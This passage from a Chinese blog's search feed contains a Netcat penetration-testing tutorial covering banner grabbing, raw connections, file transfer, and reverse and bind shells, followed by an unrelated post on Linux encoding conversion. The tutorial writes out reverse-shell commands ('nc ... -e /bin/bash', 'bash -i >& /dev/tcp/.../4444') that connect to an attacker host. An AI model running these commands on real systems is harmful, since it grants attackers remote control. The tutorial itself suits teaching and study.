        <content type="html"><![CDATA[<h4 id="1-用Netcat进行黑客攻击第1部分：基础知识"><a href="#1-用Netcat进行黑客攻击第1部分：基础知识" class="headerlink" title="1.用Netcat进行黑客攻击第1部分：基础知识"></a>1.用Netcat进行黑客攻击第1部分：基础知识</h4><p>Netcat是一个很好的网络实用程序，用于使用TCP和UPD协议读取和写入网络连接。Netcat通常被称为网络工具中的瑞士军刀，我们将在使用黑客教程的不同教程中大量使用它。Netcat最常见的用途是设置反向和绑定shell，管道和重定向网络流量，端口侦听，调试程序和脚本以及Banner抓取。在本教程中，我们将学习如何使用Netcat的基本功能，如： </p><blockquote><p>   Banner抓取  原始连接  Web服务器交互 </p></blockquote><a id="more"></a><p><br></p><h6 id="1-1-Netcat-Banner获取"><a href="#1-1-Netcat-Banner获取" class="headerlink" title="1.1        Netcat Banner获取"></a>1.1        Netcat Banner获取</h6><p>使用以下命令来获取服务器Banner（与服务建立原始连接）：</p><pre><code>nc [ip address] [port]我们来试试这个在21端口运行的Metasploitable 2上的FTP服务：nc 192.168.1.100 21nc [ip] [port]用于与端口进行原始连接，当可用时将返回服务器Banner。    code:     rocky@kail: nc 23.105.202.xx 21   # 21 ftp 控制链接     220 (vsFTPd 2.2.2)       # 系统服务 banner</code></pre><h6 id="1-2-Netcat原连接"><a href="#1-2-Netcat原连接" class="headerlink" title="1.2        Netcat原连接"></a>1.2        Netcat原连接</h6><pre><code>为了演示原始连接的工作原理，我们将在FTP服务连接到目标主机后发出一些FTP命令。在匿名的情况下，我们来看看这个FTP服务器是否允许匿名访问，通过USER和PASS命令。</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">code:</span><br><span class="line">rocky@kail: nc 23.105.202.xx 21</span><br><span class="line">220 (vsFTPd 2.2.2)</span><br><span class="line">user Postgres</span><br><span class="line">331 Please specify the password.</span><br></pre></td></tr></table></figure><h6 id="1-3-Web服务器交互"><a href="#1-3-Web服务器交互" class="headerlink" title="1.3        Web服务器交互"></a>1.3        Web服务器交互</h6><pre><code>Netcat还可以通过发出HTTP请求与Web服务器进行交互。通过以下命令，我们可以抓住在Metasploitable 2上运行的Web服务的Banner：nc 23.105.202.xx 80</code></pre><p>然后运行此HTTP请求：</p><pre><code>HEAD / HTTP / 1.0rocky@kail: nc 23.105.202.xx 80HEAD / HTTP / 1.0          &lt;&lt; 输入HTTP/1.1 400 Bad RequestServer: nginx/1.12.0Date: Sun, 28 May 2017 08:06:19 GMTContent-Type: text/htmlContent-Length: 173Connection: close</code></pre><h6 id="1-4-使用Netcat进行文件传输"><a href="#1-4-使用Netcat进行文件传输" class="headerlink" title="1.4     使用Netcat进行文件传输"></a>1.4     使用Netcat进行文件传输</h6><blockquote><p>  在这个例子中，我们将使用Netcat连接传输一个文本文件。假设我们在目标主机上执行远程命令，我们希望将文件从攻击主机传输到目标主机。首先，我们需要在目标主机上设置一个侦听器，并从攻击主机连接到它。我们将使用端口8080用于此目的，我们将该文件安全保存到桌面:  </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080&gt; 1.txt</span><br></pre></td></tr></table></figure><pre><code>在攻击主机上，我们连接到8080端口并发送文件名称transfer.txt：</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.100.107 8080 &lt; 1.txt</span><br></pre></td></tr></table></figure><h4 id="2-用Netcat进行黑客攻击第2部分：绑定和反向shell"><a href="#2-用Netcat进行黑客攻击第2部分：绑定和反向shell" class="headerlink" title="2        用Netcat进行黑客攻击第2部分：绑定和反向shell"></a>2        用Netcat进行黑客攻击第2部分：绑定和反向shell</h4><p>Netcat反向reverse shell</p><blockquote><p>  在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p></blockquote><p>在下面的内容中我们将展示使用bind shell和reverse shell。下面将使用4444端口，但请注意，这可以是任何开放端口。实际上，通常您需要使用更常见的端口，如80和443来设置反向shell，因为这些端口是更常见的打开。</p><p>NC reverse shell 工作原理:<br><img src="/img/kali/nc反向攻击.png" alt="NC reverse shell"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击主机A执行:</span><br><span class="line"> nc -lvp 4444        ; 监听被攻击者链接</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被攻击主机B执行:</span><br><span class="line">nc  xxx.xxx.xxx.xxx  4444 -e /bin/bash ; 将bash shell 权限提供给攻击者 实现控制权限的转移;</span><br></pre></td></tr></table></figure><p>实现通信后: </p><blockquote><p> 在攻击主机A上执行命令，即可操作被攻击者B</p></blockquote><p>缺点:</p><blockquote><p>  此时被攻击者B 需要使用Netcat命令， 而且普通 GNU Linux nc 并没有 -e { -e filename   program to exec after connect [dangerous]} 参数; 顾此种反向链接并不适用;</p></blockquote><h6 id="2-1-使用Bash-来代替Nc实现反向链接"><a href="#2-1-使用Bash-来代替Nc实现反向链接" class="headerlink" title="2.1  使用Bash 来代替Nc实现反向链接;"></a>2.1  使用Bash 来代替Nc实现反向链接;</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">被攻击主机B:</span><br><span class="line">bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击者A:</span><br><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">A机代码:</span><br><span class="line">[root@virtualS ~]# nc -lvp 4444</span><br><span class="line">Connection from 111.15.33.114:17835      ## 此时B机执行转移指令 bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~#</span><br><span class="line">root@kailvirtual:~# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@kailvirtual:~#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bash -i&gt;＆ /dev/tcp/23.105.202.xx/4444 0&gt;＆1 </span><br><span class="line"></span><br><span class="line">命令解释:</span><br><span class="line">bash:</span><br><span class="line">-i  if the -i option is present, the shell is interactive</span><br><span class="line"></span><br><span class="line">shell:</span><br><span class="line">0/1/2 分别代表Linux标准输入，输出，异常 即 C编程中的 stdin, stdout, stderr</span><br><span class="line"></span><br><span class="line">0&gt;&amp;1   指 将标准输入完全输出到标准输出中; </span><br><span class="line">采用&amp;可以将 0/1 绑定在一起。这条命令的作用标准输入将和标准输出同用一个文件描述符，说人话就是错误输入将会和标准输出输出到同一个地方。</span><br></pre></td></tr></table></figure><h6 id="2-2-Netcat正向bind-Shell"><a href="#2-2-Netcat正向bind-Shell" class="headerlink" title="2.2 Netcat正向bind Shell"></a>2.2 Netcat正向bind Shell</h6><pre><code>bind shell是一个绑定到目标主机上的特定端口以监听即将到来的连接的shell。我们来看看一个Netcat正向bind shell的原理:</code></pre><p><img src="/img/kali/nc正向绑定.jpg" alt="Nc Bind Shell"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">攻击主机A:</span><br><span class="line">rocky@mac: nc 192.168.1.9 4444</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo $HOSTNAME</span><br><span class="line">kailvirtual</span><br></pre></td></tr></table></figure><p>相同点:<br>        我们都需要被攻击者将其shell控制权限交给我们<br>    将shell command 以数据流的形式重定向到被攻击主机的Bash shell中;</p><p><a href="http://www.freebuf.com/column/135007.html" target="_blank" rel="noopener">更多Nc 学习参照链接</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 字符编码 查看与转换</title>
      <link href="/2017/07/09/commands/Linux_encoding/"/>
      <url>/2017/07/09/commands/Linux_encoding/</url>
      
        <content type="html"><![CDATA[<pre><code>不同操作系统之间的换行表现形式不同需要常用编码转化 以及 文件转码;</code></pre><a id="more"></a><p><br></p><p>Linux 查看文件编码格式</p><ol><li>Vim 查看文件编码  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set fileencoding   // 即可显示文件编码格式</span><br></pre></td></tr></table></figure></li></ol><pre><code>若想解决Vim查看文件乱码问题，   可以在 .vimrc 文件添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set encoding=utf-8   fileencoding=utf-8, cp936,gb2312 等</span><br></pre></td></tr></table></figure></code></pre><ol><li>enca (yum install enca) 查看文件编码  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enca   filename   // enca对某些GBK编码文件并不识别  Unrecognized encoding</span><br></pre></td></tr></table></figure></li></ol><p>文件编码转化  </p><ol><li>Vim直接转化文件编码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set fileencoding=utf-8</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>iconv </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f encoding -t encoding inputfile</span><br></pre></td></tr></table></figure><p>例如:  将一个utf-8 编码转化为GBK编码  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf-8  -t gbk  file -o file2</span><br></pre></td></tr></table></figure></li></ol><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">iconv命令用于转换指定文件的编码,默认输出到标准输出设备,亦可指定输出文件。 </span><br><span class="line">用法： </span><br><span class="line">  iconv [选项...] [文件...]  </span><br><span class="line">有如下选项可用:  </span><br><span class="line">  输入/输出格式规范：  </span><br><span class="line">  -f, --from-code=名称 原始文本编码 </span><br><span class="line">  -t, --to-code=名称 输出编码  </span><br><span class="line">  信息： </span><br><span class="line">  -l, --list 列举所有已知的字符集    </span><br><span class="line">  输出控制： </span><br><span class="line">  -c 从输出中忽略无效的字符  </span><br><span class="line">  -o, --output=FILE 输出文件  </span><br><span class="line">  -s, --silent 关闭警告  </span><br><span class="line">  --verbose 打印进度信息  </span><br><span class="line">  -?, --help 给出该系统求助列表  </span><br><span class="line">  --usage 给出简要的用法信息 </span><br><span class="line">  -V, --version 打印程序版本号    </span><br><span class="line">    例子:  </span><br><span class="line">    iconv -f utf-8 -t gb2312 aaa.txt &gt;bbb.txt  </span><br><span class="line">    这个命令读取aaa.txt文件，从utf-8编码转换为gb2312编码,其输出定向到bbb.txt文件。</span><br></pre></td></tr></table></figure></code></pre><ol><li><p>enconv<br>将一个GBK编码转化为 utf-8编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enconv -L zh_CN -x utf-8 filename</span><br></pre></td></tr></table></figure></li><li><p>dos2unix :    window 文件 cpoy 到 linux 格式转化  </p><ul><li>DOS下的文本文件是以\r\n作为断行标志的  </li><li>Mac文本是以 \r 作为换行标志</li><li>Linux文本以 \n 作为换行标志  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dos2unix filename</span><br></pre></td></tr></table></figure></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> Vim </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
